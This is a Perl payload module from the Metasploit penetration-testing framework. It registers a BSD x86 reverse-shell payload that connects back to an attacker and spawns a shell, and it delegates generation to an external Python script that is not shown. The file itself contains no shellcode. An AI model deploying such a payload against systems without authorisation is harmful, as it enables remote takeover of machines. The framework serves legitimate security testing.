
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdx86_reverse_ie;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'bsdx86reverse_ie',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/bsdx86reverse_ie.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LHOST' => '127.0.0.1', 'LPORT' => '4444',});
  return(length($bin));
}

1;
